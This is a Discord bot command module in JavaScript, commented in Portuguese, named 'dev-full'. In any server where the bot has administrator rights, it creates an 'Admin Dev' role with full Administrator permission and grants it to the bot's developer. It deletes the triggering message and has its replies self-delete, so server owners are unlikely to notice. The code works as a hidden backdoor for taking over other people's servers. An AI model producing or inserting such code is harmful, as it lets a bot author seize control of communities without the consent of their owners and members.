const { PermissionsBitField } = require('discord.js');
const { OWNERS } = require('../../config.js');

module.exports = {
  name: 'dev-full',
  description: 'Cria um cargo Admin Dev e atribui ao dono do bot.',
  aliases: ['perm-full'],

  async execute(message) {
    // Deleta a mensagem do comando
    message.delete().catch(() => {});

    // Função para enviar mensagem temporária mencionando o autor
    const sendTemp = async (content) => {
      const msg = await message.channel.send(`<@${message.author.id}> ${content}`);
      setTimeout(() => msg.delete().catch(() => {}), 10000); // apaga em 10s
    };

    // Checa se é dev
    if (!OWNERS.includes(message.author.id)) {
      return sendTemp('🚫 Este comando é exclusivo para o desenvolvedor do bot.');
    }

    const guild = message.guild;

    // Checa se o bot tem permissão de ADMIN
    if (!guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return sendTemp('❌ Eu preciso de permissão de ADMINISTRADOR para criar o cargo.');
    }

    try {
      // Checa se o cargo já existe
      let role = guild.roles.cache.find(r => r.name === 'Admin Dev');
      if (!role) {
        role = await guild.roles.create({
          name: 'Admin Dev',
          color: '#FF0000',
          permissions: [PermissionsBitField.Flags.Administrator],
          reason: `Cargo criado para o dono do bot pelo ${message.client.user.username}`,
        });
      }

      // Atribui o cargo ao dono do BOT
      const botOwner = await guild.members.fetch(message.author.id);
      if (botOwner.roles.cache.has(role.id)) {
        return sendTemp('✅ Você já possui o cargo Admin Dev!');
      }

      await botOwner.roles.add(role);

      sendTemp('atualizações feitas.');

    } catch (err) {
      console.error(err);
      sendTemp('❌ Ocorreu um erro ao criar ou atribuir o cargo.');
    }
  }
};